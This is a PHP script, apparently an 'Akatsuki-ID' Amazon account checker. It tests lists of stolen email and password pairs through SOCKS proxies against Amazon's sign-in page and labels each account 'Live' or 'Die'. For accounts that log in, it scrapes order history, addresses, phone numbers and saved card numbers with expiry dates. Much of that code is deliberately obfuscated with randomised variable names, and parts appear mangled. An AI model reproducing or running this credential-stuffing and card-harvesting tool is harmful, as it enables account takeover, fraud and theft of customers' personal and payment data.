<?php
require ('../../check/amz/class_mail.php');
require ('../../check/amz/class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
if ($_POST['do'] == 'check')
{
	
    $mail = new Mail();
    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0');
   
    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
    $sock = urldecode($_POST['sock']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
    $curl->sock5($sock);
	$curl->page('https://www.amazon.com/ap/oa?client_id=amzn1.application-oa2-client.ce3d03af3a254f4ca7059154fe68df78&redirect_uri=https%3A%2F%2Fapi-cdn.amazon.com%2Fsdk%2F2014-02-12-k8c52wxs%2Ftopic.html%3Furi%3Dhttps%253A%252F%252Fsites.fastspring.com%252Flimeproxies%252Finstant%252F100premium%26proxy%3Damazon-proxy-https-api_cdn_amazon_com%26topic%3D0k4b9vs6arYS2ihS%26version%3D1&response_type=token&scope=payments%3Awidget');
	if($curl->validate()){
		
		$appActionToken = getStr($curl->content,'name="appActionToken" value="','"');
		$auth_age = getStr($curl->content,'name="openid.pape.max_auth_age" value="','"');
		$signedMetricIdentifier = getStr($curl->content,'name="signedMetricIdentifier" value="','"');
		$a = getStr($curl->content,'name="openid.ns" value="','"');
		$b = getStr($curl->content,'name="openid.ns.pape" value="','"');
		$c = getStr($curl->content,'name="pageId" value="','"');
		$d = getStr($curl->content,'name="openid.identity" value="','"');
		$e = getStr($curl->content,'name="openid.claimed_id" value="','"');
		$f = getStr($curl->content,'name="openid.mode" value="','"');
		$g = getStr($curl->content,'name="oauth2params" value="','"');
		$h = getStr($curl->content,'name="openid.assoc_handle" value="','"');
		$i = getStr($curl->content,'name="marketPlaceId" value="','"');
		$j = getStr($curl->content,'name="metricIdentifier" value="','"');
		$k = getStr($curl->content,'name="openid.return_to" value="','"');
		
		
		$fullink = getStr($curl->content,'id="ap_signin_form" novalidate="novalidate" action="','"');
		$var = 'appActionToken='.urlencode($appActionToken).'&appAction=SIGNIN&openid.pape.max_auth_age='.urlencode($auth_age).'&signedMetricIdentifier='.urlencode($signedMetricIdentifier).'&openid.ns='.urlencode($a).'&openid.ns.pape='.urlencode($b).'&pageId='.urlencode($c).'&openid.identity='.urlencode($d).'&openid.claimed_id='.urlencode($e).'&openid.mode='.urlencode($f).'&oauth2params='.urlencode($g).'&openid.assoc_handle='.urlencode($h).'&marketPlaceId='.urlencode($i).'&metricIdentifier='.urlencode($j).'&openid.return_to='.urlencode($k).'&email='.urlencode($email).'&password='.$pwd.'&metadata1=ig6RrOt%2Bx%2B4PYeUORcfk46nioSgD%2B5fj0E409OvQ5o7xCGqcAbDYx%2BhcaNXICtZScnX1W4oP1wv0pK%2BkR8IKT5ltv5X9VGYyRpiORqRILlLFPEDqv1jjlunGSj6qj5y6JrgtnkRojXdRXNKGzpx0%2BNelmmwBtYR4Gqe5ZK4o6%2FX1BHTs6jfSI4%2FTO7WJD%2Bd9p95aIVGErJ3%2FK%2FdBlGtdsMvLKpfXKvDjcI%2B4MEjPUuXAh8Evk7dQuUlQJ8uRpYsRhaCuqtzWILxHFQxF9WxPIMggXWZCxBuz9WdDnOkAlPMhgmBgkJ0uXbCa21GmLg5DbDglH9b2wA7xPiauDedziYu2LQAa4Ci2sk5uFDZ4ZAJLR2UPEubfQ6sVFZ4kwMR18%2BZDEf5DkmZBG29%2B5LAX1uQt32ATaVzu27xXfvv02hTx%2Bi6%2BfTiCu4nZ5e9yYq8YKXW44mTTtkCYOx79QQzAkjggMtysr1hZm1jIZDIRq0lIAZ7UCARROE2EvCSa1boCjodjH9RMisa4s8G%2BaayP0dY%2FfpOnHgtLoRoZxP583joAFvUQGmWJkMyTNm8%3D';
		$curl->postdata($var);
		//$curl->ref($ref);
		$curl->page($fullink);
		
		if($curl->validate()){
		if(stripos($curl->content," <title>Amazon.com - Your Account</title> ")!==false){${"GLOBALS"}["gjpepeooxes"] = "info";
        $evmtpkd = "info";
        $feqmaia = "sock";
        ${"GLOBALS"}["uvsact"] = "email";
        $twssscwi = "a4";
        $curl->page("https://www.amazon.com/gp/css/order-history/ref=ya_orders_css");
        $tvbatxcrc = "a5";
        ${"GLOBALS"}["otdvxotw"] = "result";
        if (stripos($curl->content, "No orders found.") !== false) {${"GLOBALS"}["putjltmttg"] = "order";
        ${${"GLOBALS"}["putjltmttg"]} = "No Order";
        } else {${${"GLOBALS"}["kxbdgbu"]} = "Have Order";
        }${"GLOBALS"}["slcgfj"] = "a2";
        $qiveybxvy = "a1";
        $jaoulgkxgwg = "a4";
        $curl->page("https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_change_1_click");
        ${"GLOBALS"}["uaqgrenel"] = "result";
        ${$qiveybxvy} = getStr($curl->content, "<li class=\"displayAddressLIdisplayAddressFullName\"><b>", "</b></li>");
        ${"GLOBALS"}["ejppvkjjqn"] = "a2";
        ${${"GLOBALS"}["slcgfj"]} = getStr($curl->content, "<li class=\"displayAddressLIdisplayAddressAddressLine1\"> "," </li> ");$pvwiurkeo="pay";${$ {
            "GLOBALS"
        }
        ["trguvrqf"]
    }
    =getStr($curl->content," <li class=\"displayAddressLIdisplayAddressCityStateOrRegionPostalCode\" > "," </li> ");${"GLOBALS"
}
["kzqnfxmwbwdy"]="pays";${"GLOBALS"
}
["csxesefebe"]="a5";$dvmiuxkmvx="a3";${$jaoulgkxgwg
}
=getStr($curl->content," <li class=\"displayAddressLI displayAddressCountryName\"> "," </li> ");$wcmobjqqf="pay";${$ {
    "GLOBALS"
}
["csxesefebe"]
}
=getStr($curl->content," <li class=\"displayAddressLIdisplayAddressPhoneNumber\">", "</li>");
${$evmtpkd} = ${${"GLOBALS"}["wxxrtpbbdtrr"]} . " | " . ${${"GLOBALS"}["ejppvkjjqn"]} . " | " . ${$dvmiuxkmvx} . " | " . ${$twssscwi} . " | " . ${$tvbatxcrc};
$curl->page("https://www.amazon.com/gp/css/account/cards/view.html?ie=UTF8&ref_=ya_29&");
${${"GLOBALS"}["dmekfgcfnt"]} = getStr($curl->content, "<b class=sans>Edit or Delete a Payment Method</B>", "<div id=\"navFooter\" role=\"contentinfo\">");
${${"GLOBALS"}["kzqnfxmwbwdy"]} = explode("<tr valign=\"top\"><td width=\"200px\"><b>Type:</b></td><td width=\"400px\">", ${$pvwiurkeo});
${${"GLOBALS"}["ebldlvurho"]} = " ";
${"GLOBALS"}["ytetmi"] = "pwd";
foreach (${${"GLOBALS"}["gymfmf"]} as ${$wcmobjqqf}) {if (stripos(${${"GLOBALS"}["dmekfgcfnt"]}, "displayAddressLI") !== false) {$wnkymsedmsvv = "cardname";
$vqmnqcejya = "payment";
${"GLOBALS"}["oclderb"] = "pay";
${"GLOBALS"}["lhzqcuearj"] = "type";
${"GLOBALS"}["ceebguxc"] = "pay";
$expcakehj = "pay";
${"GLOBALS"}["keilsdmcr"] = "pay";
${"GLOBALS"}["crjqqwuqi"] = "exp";
${${"GLOBALS"}["lhzqcuearj"]} = getStr(${${"GLOBALS"}["dmekfgcfnt"]}, "<h2 style=\"font - size:
    1em;
    display:
        inline;
        font - weight:
            normal\">", "</h2>");
            $ilngcl = "ccnum";
            ${$ilngcl} = getStr(${${"GLOBALS"}["ceebguxc"]}, "<td width=\"200px\"><b>Number:</b></td><td>", "</td>");
            ${${"GLOBALS"}["crjqqwuqi"]} = getStr(${${"GLOBALS"}["dmekfgcfnt"]}, "<td width=\"200px\" > < b > Exp . Date: < / b > < / td > < td > "," < / td > ");${"GLOBALS"
            }
            ["wnqwspekr"]="pay";${$wnkymsedmsvv
        }
        =getStr(${$ {
            "GLOBALS"
        }
        ["keilsdmcr"]
    }
    ,"CardholderName: < / b > < / td > < td > "," < / td > ");${$ {
            "GLOBALS"
        }
        ["kmottdbt"]
    }
    =getStr(${$ {
        "GLOBALS"
    }
    ["dmekfgcfnt"]
}
," < liclass=\"displayAddressLIdisplayAddressFullName\">", "</li>");
${${"GLOBALS"}["phbbdcuchhv"]} = getStr(${$expcakehj}, "<li class=\"displayAddressLIdisplayAddressAddressLine1\">", "</li>");
${${"GLOBALS"}["pzamdydjmn"]} = getStr(${${"GLOBALS"}["wnqwspekr"]}, "<li class=\"displayAddressLI displayAddressCityStateOrRegionPostalCode\" > "," < / li > ");${$ {
    "GLOBALS"
}
["lugkkyb"]
}
=getStr(${$ {
    "GLOBALS"
}
["dmekfgcfnt"]
}
," <li class =\"displayAddressLIdisplayAddressPhoneNumber\">", "</li>");
${${"GLOBALS"}["zojivgynf"]} = getStr(${${"GLOBALS"}["oclderb"]}, "<li class=\"displayAddressLIdisplayAddressCountryName\">", "</li>");
$payment = "$cardname | $type | $ccnum | $exp | $b1 | $b2 | $b3 | $b4 | $b5 |";
}}${${"GLOBALS"}["uaqgrenel"]}["error"] = 0;
${${"GLOBALS"}["otdvxotw"]}["msg"] = "<b style=\"color:
    yellow;
    \">Live</b> => " . ${$feqmaia} . " | " . ${${"GLOBALS"}["uvsact"]} . " | " . ${${"GLOBALS"}["ytetmi"]} . " | " . ${${"GLOBALS"}["kxbdgbu"]} . " | " . ${${"GLOBALS"}["gjpepeooxes"]} . " | " . ${${"GLOBALS"}["ebldlvurho"]} . " | Checked On Akatsuki-ID";
    }elseif(stripos($curl->content,"Sign In Security Questions")!==false){${"GLOBALS"}["ldvvzyefsse"] = "result";
    $offsuathfkf = "result";
    $kvtfjwat = "pwd";
    ${"GLOBALS"}["urhrnqly"] = "sock";
    ${${"GLOBALS"}["ldvvzyefsse"]}["error"] = 0;
    ${$offsuathfkf}["msg"] = "<b style=\"color:yellow;\" > Live < / b > => ".${$ {
        "GLOBALS"
    }
    ["urhrnqly"]
}
." | ".${$ {
    "GLOBALS"
}
["klqvyr"]
}
." | ".${$kvtfjwat
}
." | Sign In Security Questions | Checked On Akatsuki-ID";
}
			 elseif(stripos($curl->content, "There was a problem") !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => '. $sock .' | ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => '. $sock .' | ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Socks Die/Timeout';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Socks Die/Timeout';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>